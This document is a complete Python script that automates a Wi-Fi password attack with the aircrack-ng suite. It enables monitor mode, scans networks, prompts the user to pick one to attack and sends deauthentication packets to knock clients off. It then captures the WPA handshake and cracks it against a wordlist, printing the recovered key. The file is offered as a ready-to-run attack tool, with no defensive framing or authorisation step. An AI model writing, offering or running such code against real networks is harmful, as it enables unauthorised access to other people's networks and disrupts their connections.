import os
import re
import sys
import time
import signal
import subprocess
from threading import Thread
from collections import defaultdict

class HackWiFiPassword:
    def __init__(self, interface=None):
        self.interface = interface or self.detect_wireless_interface()
        self.running = True
        self.networks = []
        self.handshake_dir = "handshakes"
        os.makedirs(self.handshake_dir, exist_ok=True)
        signal.signal(signal.SIGINT, self.cleanup_handler)
        self.check_dependencies()

    def detect_wireless_interface(self):
        try:
            output = subprocess.check_output(["iw", "dev"], text=True)
            matches = re.findall(r"Interface\s+(\w+)", output)
            if matches:
                print(f"[*] Detected wireless interface: {matches[0]}")
                return matches[0]
            else:
                print("[!] No wireless interface found.")
                sys.exit(1)
        except Exception as e:
            print(f"[!] Error detecting interface: {e}")
            sys.exit(1)

    def check_dependencies(self):
        tools = ["aircrack-ng", "iw", "airodump-ng", "aireplay-ng"]
        missing = [tool for tool in tools if not self._which(tool)]
        if missing:
            print(f"[!] Missing tools: {', '.join(missing)}")
            sys.exit(1)

    def _which(self, tool):
        return subprocess.run(["which", tool], stdout=subprocess.DEVNULL).returncode == 0

    def cleanup_handler(self, signum, frame):
        self.running = False
        self.cleanup()
        sys.exit(0)

    def cleanup(self):
        print("\n[*] Cleaning up and restoring interface...")
        subprocess.run(["sudo", "pkill", "airodump-ng"], stderr=subprocess.DEVNULL)
        subprocess.run(["sudo", "pkill", "aireplay-ng"], stderr=subprocess.DEVNULL)
        subprocess.run(["sudo", "ip", "link", "set", self.interface, "down"])
        subprocess.run(["sudo", "iw", "dev", self.interface, "set", "type", "managed"])
        subprocess.run(["sudo", "ip", "link", "set", self.interface, "up"])

    def start_monitor_mode(self):
        print(f"[*] Enabling monitor mode on {self.interface}...")
        subprocess.run(["sudo", "ip", "link", "set", self.interface, "down"])
        subprocess.run(["sudo", "iw", "dev", self.interface, "set", "type", "monitor"])
        subprocess.run(["sudo", "ip", "link", "set", self.interface, "up"])

    def channel_hopper(self):
        while self.running:
            for ch in range(1, 14):
                subprocess.run(["sudo", "iw", "dev", self.interface, "set", "channel", str(ch)], stderr=subprocess.DEVNULL)
                time.sleep(0.5)

    def scan_networks(self, duration=15):
        print("[*] Scanning for networks... Press Ctrl+C to stop early.")
        hopper = Thread(target=self.channel_hopper)
        hopper.daemon = True
        hopper.start()

        subprocess.run(["rm", "-f", "scan-01.csv"])
        proc = subprocess.Popen([
            "sudo", "airodump-ng", self.interface, "--write", "scan", "--output-format", "csv"
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        time.sleep(duration)
        proc.terminate()
        time.sleep(2)

        self.parse_csv("scan-01.csv")

    def parse_csv(self, path):
        try:
            with open(path) as f:
                content = f.read()
            sections = content.split("\r\n\r\n")
            lines = sections[0].split("\r\n")[2:]
            for line in lines:
                if not line.strip():
                    continue
                parts = [x.strip() for x in line.split(",")]
                if len(parts) >= 14:
                    self.networks.append({
                        "bssid": parts[0],
                        "channel": parts[3],
                        "encryption": parts[5],
                        "essid": parts[13]
                    })
        except FileNotFoundError:
            print("[!] CSV scan results not found.")

    def display_networks(self):
        print("\nNo  BSSID              CH ENC     ESSID")
        print("--  ----------------- -- ------- ------------------")
        for i, net in enumerate(self.networks):
            print(f"{i+1:2}  {net['bssid']}  {net['channel']:>2} {net['encryption']:<7} {net['essid']}")

    def select_target(self):
        choice = input("\nSelect network number to attack: ")
        if not choice.isdigit() or not (1 <= int(choice) <= len(self.networks)):
            print("[!] Invalid selection.")
            return None
        return self.networks[int(choice)-1]

    def capture_handshake(self, target):
        filename = os.path.join(self.handshake_dir, re.sub(r"[^a-zA-Z0-9]", "_", target["essid"]))
        print(f"[*] Starting capture on {target['essid']} ({target['bssid']})")

        airodump = subprocess.Popen([
            "sudo", "airodump-ng",
            "--bssid", target["bssid"],
            "-c", target["channel"],
            "-w", filename,
            self.interface
        ])

        time.sleep(5)
        print("[*] Sending deauth packets...")
        subprocess.run([
            "sudo", "aireplay-ng", "--deauth", "10", "-a", target["bssid"], self.interface
        ])

        print("[*] Waiting for handshake (30s)...")
        time.sleep(30)
        airodump.terminate()
        return f"{filename}-01.cap"

    def try_crack(self, capfile):
        print("[*] Attempting to crack handshake with aircrack-ng")
        rockyou = "/usr/share/wordlists/rockyou.txt"
        if not os.path.exists(rockyou):
            rockyou = input("Enter path to wordlist: ")

        result = subprocess.run(["aircrack-ng", "-w", rockyou, capfile], capture_output=True, text=True)
        if "KEY FOUND!" in result.stdout:
            key = re.search(r"KEY FOUND! \[(.*?)\]", result.stdout)
            print(f"[+] Password found: {key.group(1)}")
        else:
            print("[!] Password not found.")

    def run(self):
        self.start_monitor_mode()
        self.scan_networks()
        self.display_networks()

        target = self.select_target()
        if target:
            capfile = self.capture_handshake(target)
            self.try_crack(capfile)

        self.cleanup()

if __name__ == "__main__":
    tool = HackWiFiPassword()
    tool.run()
